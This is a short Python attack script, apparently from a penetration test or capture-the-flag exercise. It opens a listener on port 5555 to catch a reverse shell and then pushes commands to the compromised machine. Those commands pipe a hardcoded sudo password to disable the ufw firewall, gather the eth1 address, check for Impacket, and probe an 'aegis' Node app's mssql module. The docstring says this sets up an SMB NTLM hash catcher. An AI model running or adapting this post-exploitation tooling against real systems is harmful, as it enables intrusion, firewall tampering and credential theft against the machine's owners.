#!/usr/bin/env python3
"""On-box: disable ufw, start smb catcher note, trigger bulk insert via node."""
import socket
import threading
import sys
import time

PORT = 5555
PASS = r"opc0932k90%%lODFI93-++"

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT))
s.listen(1)
print("[*] listen", PORT, flush=True)
c, a = s.accept()
print("[+]", a, flush=True)


def recv():
    while True:
        d = c.recv(8192)
        if not d:
            break
        sys.stdout.buffer.write(d)
        sys.stdout.flush()


threading.Thread(target=recv, daemon=True).start()
time.sleep(1)

# Minimal SMB-ish NTLM catcher is hard; use Impacket if present, else python script from us.
# First: find eth1 IP and start smbserver via pip/impacket or download.
script = r"""
echo '""" + PASS + r"""' | sudo -S bash -c 'ufw disable; ip -4 addr show eth1; which python3'
"""
# send carefully as single lines
for cmd in [
    f"echo '{PASS}' | sudo -S ufw disable",
    "ip -4 -o addr show eth1 | awk '{print $4}'",
    "python3 -c 'import impacket; print(\"impacket-ok\")' 2>/dev/null || echo no-impacket",
    "ls /home/webadmin/aegis/node_modules/mssql/package.json",
    "echo READY",
]:
    print(">>>", cmd, flush=True)
    c.send((cmd + "\n").encode())
    time.sleep(2)

time.sleep(3)
c.close()
